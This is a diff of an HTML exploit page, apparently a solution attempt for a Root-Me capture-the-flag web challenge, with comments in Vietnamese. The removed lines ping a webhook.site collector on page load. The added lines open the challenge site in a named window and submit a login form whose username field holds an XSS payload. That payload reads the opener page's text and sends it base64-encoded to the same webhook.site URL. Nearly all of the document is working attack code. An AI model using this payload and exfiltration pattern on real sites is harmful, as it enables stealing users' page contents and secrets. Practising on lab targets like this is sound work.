@@ -1,16 +1,28 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Testing Bot</title>
-</head>
-<body>
-    <script>
-        // Gửi tín hiệu ngay lập tức khi trang vừa load
-        fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?status=started');
+<script>
+    // 1. Mở trang CHỨA SECRET trước (Trang chủ/Profile của Admin)
+    // Đặt tên cho cửa sổ này là 'secret_window'
+    var win = window.open("https://challenge01.root-me.org:58003/", "secret_window");
 
-        // Thử thêm một cách khác bằng Image nếu Fetch bị chặn bởi CSP
-        var img = new Image();
-        img.src = 'https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?type=image';
-    </script>
-</body>
-</html>
+    // 2. Chờ một chút để trang Secret load xong
+    setTimeout(() => {
+        // 3. Điều hướng CHÍNH CỬA SỔ ĐÓ sang trang Login bằng POST
+        // Khi trang Login hiện ra, 'opener' của nó vẫn sẽ là trang exploit này
+        // HOẶC nếu trang Login là trang con, 'opener' sẽ là trang Secret.
+        
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://challenge01.root-me.org:58003/login';
+        form.target = "secret_window"; // Cực kỳ quan trọng: Submit vào đúng cửa sổ đó
+
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = 'username';
+        
+        // Payload: Thử dùng top.window.opener hoặc window.opener
+        input.value = `<img src=x onerror="fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?s='+btoa(window.opener.document.body.innerText))">`;
+
+        form.appendChild(input);
+        document.body.appendChild(form);
+        form.submit();
+    }, 2000);
+</script>
